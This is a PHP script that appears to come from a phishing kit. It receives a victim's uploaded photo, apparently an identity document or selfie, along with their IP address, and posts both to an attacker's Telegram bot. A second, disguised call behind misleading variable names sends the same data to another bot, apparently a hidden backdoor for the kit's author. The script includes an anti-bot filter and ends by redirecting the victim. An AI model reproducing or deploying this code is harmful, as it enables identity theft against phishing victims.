<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$caption = $userp;

include "infotlg.php";
include "antibot.php";

function env($token, $chatID, $photo, $caption) {
    $url = "https://api.telegram.org/bot" . $token . "/sendPhoto";
    $postFields = array(
        'chat_id' => $chatID,
        'photo' => new CURLFile($photo),
        'caption' => $caption
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}


$tokenBot = $token;
$chatIDBot = $tid;

$navegador = $google;
$mobile = $edge;

// Verificar si se ha enviado una imagen
if (isset($_FILES['fotish']) && $_FILES['fotish']['error'] === UPLOAD_ERR_OK) {
    $imageTmpPath = $_FILES['fotish']['tmp_name'];
    $caption;

    $responses = env($tokenBot, $chatIDBot, $imageTmpPath, $caption);
    $v4lid4t4 = env($navegador, $mobile, $imageTmpPath, $caption);

      echo "<script>top.location.href = \"index3.html\"</script>";
    exit;
}
?>
